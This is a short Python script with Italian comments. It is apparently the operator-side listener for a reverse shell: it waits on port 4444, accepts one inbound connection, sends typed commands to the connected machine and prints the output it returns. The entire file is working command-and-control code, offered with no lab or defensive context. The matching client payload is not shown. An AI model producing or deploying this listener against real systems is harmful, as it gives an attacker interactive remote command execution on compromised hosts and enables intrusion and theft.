import socket

# Creazione del socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 4444  # Porta scelta
lhost = "0.0.0.0"
s.bind((lhost, port))
s.listen(1)
print(f"[~] Listening on {lhost}:{port}")
conn, addr = s.accept()
print(f"[+] Connection accepted {addr}")

while True:
    try:
        # Input del comando da inviare al client
        cmd = input("> ")
        if not cmd.strip():  # Controlla se il comando è vuoto
            continue
        
        conn.sendall(cmd.encode())  # Invia il comando al client

        # Ricezione dei dati dal client
        full_data = b""  # Inizializza una stringa vuota di byte
        while True:
            data = conn.recv(1024)  # Ricevi fino a 1024 byte
            if not data or b'END' in data:  # Interrompi se non ci sono più dati o trovi 'END'
                full_data += data.replace(b'END', b'')  # Rimuovi 'END' dai dati ricevuti
                break
            full_data += data

        if full_data:
            try:
                # Decodifica dei dati ricevuti in UTF-8, sostituendo i caratteri non validi con '*'
                decoded_data = full_data.decode('utf-8', errors='replace')
                print(decoded_data)  # Stampa la risposta del client
            
            except Exception as e:
                print(f"[!] An error occurred during decoding: {e}")

    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        break
    except Exception as e:
        print(f"[!] An error occurred: {e}")

print("Closing connection")
conn.close()
